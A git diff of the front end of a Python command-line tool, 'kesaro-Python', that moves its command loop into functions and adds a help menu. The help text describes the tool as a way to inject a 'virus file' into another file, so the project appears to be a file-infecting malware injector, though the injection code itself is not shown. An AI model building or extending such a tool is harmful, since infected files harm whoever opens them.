@@ -1,10 +1,26 @@
 from resources.injector import *
 from resources.file_manager import *
 from resources.properties_manager import *
-from resources.get_help import *
+import sys
 
-while True:
-    command = input('\n > ').strip()
+
+
+def show_help():
+    print("Welcome to the kesaro-Python tool!")
+    print("=================================")
+    print("Available commands:")
+    print("help: Show this help message")
+    print("quit: Quits the program")
+    print("explain: explains how to inject files")
+    print()
+
+def execute_command(command):
+    if command == 'help':
+        show_help()
+    elif command == 'quit':
+        sys.exit("Exiting the program...")
+    elif command == 'explain':
+        print("   To inject the payload, use the command: inject [THE  PATH FROM YOUR VIRUS FILE HERE] > [THE PATH FROM THE FILE TO INJECT HERE]")
     if command.count(' ') > 0:
         command = command.split(' ')
     else:
@@ -28,3 +44,14 @@ while True:
 
     elif command[0] == 'clear':
         os.system('cls')
+        
+    else:
+        print("Unknown command. Please try again.")
+        
+
+def start_help_center():
+    while True:
+        command = input("Enter a command (type 'help' for available commands and help): ")
+        execute_command(command)
+
+start_help_center()
